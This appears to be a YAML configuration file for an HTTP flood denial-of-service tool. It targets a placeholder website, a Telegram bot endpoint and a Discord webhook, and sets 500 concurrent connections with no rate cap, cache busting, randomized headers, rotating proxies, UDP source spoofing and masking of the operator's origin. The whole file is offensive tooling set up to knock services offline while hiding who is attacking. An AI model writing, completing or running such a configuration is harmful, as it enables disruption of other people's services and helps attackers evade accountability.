targets:
  - name: example_web
    url: https://target.example.com/
    type: http
  - name: telegram_bot
    url: https://api.telegram.org/bot<BOT_TOKEN>/getMe
    type: telegram
  - name: discord_webhook
    url: https://discord.com/api/webhooks/<ID>/<TOKEN>
    type: discord

attack:
  vector: http_flood
  concurrency: 500
  duration_sec: 300
  requests_per_sec_cap: 0
  cache_buster: true
  randomize_headers: true
  follow_redirects: false
  timeout_sec: 8

proxy:
  file: proxies.txt
  health_check_url: https://api.ipify.org
  health_check_concurrency: 100
  rotate: round_robin
  max_failures_before_drop: 3

obfuscation:
  chain_tor: false
  spoof_source_udp: true
  jitter_ms: [10, 250]

logging:
  level: INFO
  mask_origin: true
  file: run.log
